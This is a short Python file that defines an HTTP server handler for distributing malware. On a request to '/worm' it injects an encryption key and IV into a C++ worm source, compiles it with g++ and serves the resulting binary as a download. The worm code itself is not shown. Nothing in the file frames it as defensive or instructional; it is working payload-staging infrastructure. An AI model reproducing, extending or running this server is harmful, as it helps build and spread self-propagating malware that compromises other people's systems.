from http.server import SimpleHTTPRequestHandler
import socketserver
import sys
import os
import json
import shutil
import subprocess

class PayloadHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/worm':
            # 1. 讀取 key/iv
            with open('secret_key_iv.json', 'r') as f:
                data = json.load(f)
            key = data['key']
            iv = data['iv']
            # 2. 產生 worm.c 臨時檔，直接替換
            with open('worm.cpp', 'r') as f:
                c_code = f.read()
            c_code = c_code.replace('<REPLACE_KEY>', key)
            c_code = c_code.replace('<REPLACE_IV>', iv)
            with open('worm_gen.cpp', 'w') as f:
                f.write(c_code)

            # 3. 編譯 worm
            compile_cmd = 'g++ worm_gen.cpp -o worm -lssl -lcrypto'
            subprocess.run(compile_cmd, shell=True, check=True)

            # 4. 傳送 worm_bin
            self.send_response(200)
            self.send_header('Content-type', 'application/octet-stream')
            self.send_header('Content-Disposition', 'attachment; filename="worm"')
            self.end_headers()
            with open('worm', 'rb') as f:
                shutil.copyfileobj(f, self.wfile)
        else:
            super().do_GET()
